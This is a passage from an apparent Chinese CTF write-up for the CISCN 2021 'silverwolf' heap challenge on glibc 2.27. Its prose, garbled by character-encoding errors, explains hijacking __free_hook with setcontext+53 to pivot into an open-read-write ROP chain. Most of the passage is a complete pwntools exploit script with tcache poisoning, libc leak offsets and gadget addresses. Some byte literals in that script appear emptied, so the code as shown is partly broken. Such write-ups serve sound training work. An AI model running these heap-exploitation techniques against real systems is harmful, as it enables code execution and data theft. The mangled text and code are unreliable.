†ä¸Šå—ï¼Ÿè€Œåœ¨Glibc2.27é‡Œé¢setcontextæ˜¯ä½¿ç”¨rdiå»æ§åˆ¶çš„ï¼Œï¼ˆæ³¨ï¼›2.29è²Œä¼¼æ˜¯rdxæ§åˆ¶çš„ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ§åˆ¶rdi,è€Œfree_hookåœ¨é‡Šæ”¾chunkçš„æ—¶å€™ï¼Œrdié‡Œé¢çš„å€¼ï¼Œåˆšå¥½ä¼šæ˜¯ä½ freeçš„é‚£ä¸ªå †å—çš„åœ°å€ï¼Œé‚£ä¹ˆè¿™æ ·ä¸å°±å¯ä»¥æŠŠrdiæ§åˆ¶ä¸ºæˆ‘ä»¬æŒ‡å®šçš„chunkçš„åœ°å€å—ï¼Ÿæ¥ä¸‹æ¥0x40~0x80è¿™å‡ ä¸ªchunkçš„ä½œç”¨ï¼Œä¹Ÿè®¸ä½ ä»¬å°±çŸ¥é“æ˜¯ä»€ä¹ˆäº†ï¼Œå…¶ä¸­0x70å’Œ0x80æ˜¯ä¸ºäº†å¸ƒç½®ORWè¯»å–flagçš„fake_stackï¼Œå› ä¸ºROPé“¾å¤ªé•¿äº†ï¼Œå¯¼è‡´ä¸€ä¸ªchunkçš„ç©ºé—´ä¸å¤Ÿï¼Œæ‰€ä»¥éœ€è¦ä¸¤ä¸ªç›¸é‚»çš„chunkæ¥æ‹¼æ¥ï¼Œç„¶å0x40çš„chunkæ˜¯ä¸ºäº†è¯»â€flagâ€è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”å¯ä»¥æŠŠflagçš„å†…å®¹è¯»åœ¨ä¸Šé¢ï¼Œ</p><p>æ³¨æ„æ¥ä¸‹æ¥çš„æ“ä½œï¼šé¦–å…ˆæŠŠtcache biné‡Œé¢çš„0x20çš„chunkç”³è¯·å‡ºæ¥ï¼Œå¹¶ä¸”ä¿®æ”¹ä¸ºsetcontext+53çš„ä½ç½®ï¼Œ(å› ä¸ºsetcontext+53çš„ä½ç½®æ˜¯mov rsp,[rsi+0xa0])ï¼Œè¿™æ ·ä¸‹æ¬¡æ‰§è¡Œfreeçš„æ—¶å€™å°±ä¼šç›´æ¥è·³åˆ°setcontext+53çš„ä½ç½®ï¼Œä»è€Œå°†rspç§»åŠ¨åˆ°å¯¹åº”çš„ä½ç½®ï¼Œé‚£ä¹ˆè¿™é‡Œæ˜¯ç¬¬ä¸€æ­¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å¹²å•¥å‘¢ï¼Ÿç¬¬äºŒæ­¥ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦æŠŠ0x60è¿™ä¸ªchunkçš„å†…å®¹ä¸Šæ”¾ä¸Šheap+0x3000ä¹Ÿå°±æ˜¯ORWçš„åœ°å€ï¼Œé‚£ä¹ˆç°åœ¨ï¼Œæˆ‘ä»¬å¦‚æœæŠŠ0x50é‚£ä¸ªchunké‡Šæ”¾æ‰ï¼Œå°±ä¼šä½¿å¾—rdi &#x3D;&#x3D; chunk_size_0x50 <del>è¡¨æ„å†™æ³•ï¼Œä¸è¦åœ¨æ„</del>ï¼Œå¹¶ä¸”åŒæ—¶è§¦å‘setcontext,å°†rdi+0xa0åœ°æ–¹çš„å†…å®¹ç»™rspï¼Œè¿™é‡Œrdi+0xa0çš„åœ°æ–¹å…¶å®å°±æ˜¯heap_base+0x2000+a0 &#x3D;&#x3D;&#x3D;&#x3D;&gt; heap_base+0x20a0ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°æ–¹çš„å€¼æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿé‚£ä¸å°±æ˜¯æˆ‘ä»¬å‰é¢çš„heap_base+0x3000å—ï¼Ÿé‚£ä¹ˆä¸å°±æŠŠrspæ”¾å½“orwä¸Šæ¥äº†å—ï¼Ÿè¿™æ ·å°±å¯ä»¥åœ¨æ‰§è¡Œå®Œsetcontextä¹‹åæ‰§è¡ŒORWäº†ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ä¿®æ”¹0x60è¿™ä¸ªchunkçš„å†…å®¹ä¸ºheap_base+0x3000çš„æ—¶å€™ï¼Œåé¢è¿˜éœ€è¦åŠ ä¸€ä¸ªretï¼Œå› ä¸ºsetcontexté‡Œé¢æœ‰ä¸€ä¸ªpush,ä¸ºäº†å¹³è¡¡ï¼Œéœ€è¦retå¼„å›æ¥ï¼Œ</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/setcontext1.png" class><p>å¹¶ä¸”åœ¨æ„é€ ORWçš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„openè¦ä½¿ç”¨syscallçš„æ–¹å¼æ„é€ ä¸å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œè¦ç”¨syscallï¼Œè¿™æ˜¯å› ä¸ºåœ¨2.27é‡Œï¼Œopenå‡½æ•°å¼€å§‹çš„ä½ç½®ä¼šå½±å“æ ˆå¸ƒå±€ï¼Œå…·ä½“å¦‚ä¸‹:</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/open.png" class><p>è€Œreadå’Œwriteå°±ä¸ä¼š</p><img src="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/read_and_wrote.png" class><h2 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿œç¨‹/æœ¬åœ°åˆ‡æ¢</span></span><br><span class="line"><span class="keyword">if</span> args.get(<span class="string">&quot;REMOTE&quot;</span>):</span><br><span class="line">    io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28172</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ELFåŠ è½½</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== å¸¸ç”¨å‡½æ•°å®šä¹‰ ==========</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        : io.sendafter(<span class="built_in">str</span>(delim), data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(<span class="built_in">str</span>(delim), data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    : io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">False</span> : io.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         : log.success(<span class="string">&#x27;&#123;&#125; ======== &gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">p       = <span class="keyword">lambda</span> name,data          : <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; ======== &gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name,data))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== å¸¸ç”¨æ³„éœ²å‡½æ•° ==========</span></span><br><span class="line">l64     = <span class="keyword">lambda</span>                    : u64(io.recvuntil(<span class="string">b&quot;&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;&quot;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    : u32(io.recvuntil(<span class="string">b&quot;ï¿½&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;&quot;</span>))</span><br><span class="line">l64_no  = <span class="keyword">lambda</span>                    : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">  gdb.attach(io)</span><br><span class="line">  pause()</span><br><span class="line"><span class="comment"># [+] ========= Some funtion ========= [+]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># ========== Exploit å¼€å§‹ ==========</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x78</span>)</span><br><span class="line">        edit(<span class="string">b&#x27;source&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        edit(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">        delete()</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    heap_addr = uu64(ru(<span class="string">b&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>,drop=<span class="literal">True</span>))&amp;<span class="number">0xffffffffff000</span></span><br><span class="line">    leak(<span class="string">&quot;heap_addr&quot;</span>,heap_addr)</span><br><span class="line">    edit(p64(heap_addr+<span class="number">0x10</span>)) </span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="string">b&#x27;&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    delete()</span><br><span class="line">    show()</span><br><span class="line"></span><br><span class="line">    libc_base = l64()-<span class="number">0x3ebca0</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">    bug()   </span><br><span class="line">    <span class="comment"># [+] ========= change stuck from tcache ========= [+]</span></span><br><span class="line">    pay = <span class="string">b&#x27;&#x27;</span>*<span class="number">0x40</span>+p64(libc_base+libc.sym.__free_hook)+p64(<span class="number">0</span>)</span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x1000</span>)    <span class="comment"># flag_addr heap:0x40</span></span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x2000</span>)    <span class="comment"># fake_chunk heap:0x50</span></span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x20a0</span>)    <span class="comment"># stack 2 heap:0x60</span></span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x3000</span>)    <span class="comment"># orw1 heap:0x70</span></span><br><span class="line">    pay += p64(heap_addr+<span class="number">0x3060</span>)    <span class="comment"># orw2 heap:0x80 continue orw1</span></span><br><span class="line">    edit(pay)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># [+] ====== Some addr ======= [+]</span></span><br><span class="line">    rax = libc_base+<span class="number">0x000000000001b500</span></span><br><span class="line">    rdi = libc_base+<span class="number">0x000000000002164f</span></span><br><span class="line">    rsi = libc_base+<span class="number">0x0000000000023a6a</span></span><br><span class="line">    rdx = libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">    ret = libc_base+<span class="number">0x00000000000008aa</span></span><br><span class="line">    syscall = libc_base+libc.sym.read+<span class="number">15</span></span><br><span class="line">    leave_ret = libc_base+<span class="number">0x00000000000547e3</span></span><br><span class="line"></span><br><span class="line">    setcontext = libc_base+libc.sym.setcontext+<span class="number">53</span></span><br><span class="line">    read = libc_base+libc.sym.read</span><br><span class="line">    write = libc_base+libc.sym.write</span><br><span class="line">    flag = heap_addr+<span class="number">0x1000</span></span><br><span class="line">    get_flag = heap_addr+<span class="number">0x3000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># [+] ====== O R W ========== [+]</span></span><br><span class="line">    o = p64(rdi)+p64(flag)</span><br><span class="line">    o += p64(rsi)+p64(<span class="number">0</span>)</span><br><span class="line">    o += p64(rax)+p64(<span class="number">2</span>)</span><br><span class="line">    o += p64(syscall)</span><br><span class="line"></span><br><span class="line">    r = p64(rdi)+p64(<span class="number">3</span>)</span><br><span class="line">    r += p64(rsi)+p64(get_flag)</span><br><span class="line">    r += p64(rdx)+p64(<span class="number">0x100</span>)</span><br><span class="line">    r += p64(read)</span><br><span class="line"></span><br><span class="line">    w = p64(rdi)+p64(<span class="number">1</span>)</span><br><span class="line">    w += p64(write)</span><br><span class="line">    </span><br><span class="line">    orw = o+r+w</span><br><span class="line"></span><br><span class="line">    leak(<span class="string">&quot;setcontext&quot;</span>,setcontext)</span><br><span class="line">    add(<span class="number">0x18</span>)</span><br><span class="line">    edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x38</span>)</span><br><span class="line">    edit(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>)</span><br><span class="line">    edit(orw[:<span class="number">0x60</span>])    <span class="comment"># orw1</span></span><br><span class="line">    add(<span class="number">0x78</span>) </span><br><span class="line">    edit(orw[<span class="number">0x60</span>:])    <span class="comment"># orw2</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>)</span><br><span class="line">    edit(p64(heap_addr+<span class="number">0x3000</span>)+p64(ret))</span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    delete()</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="comment">#bug()</span></span><br><span class="line">exp()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heap_sandbox-2.27 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
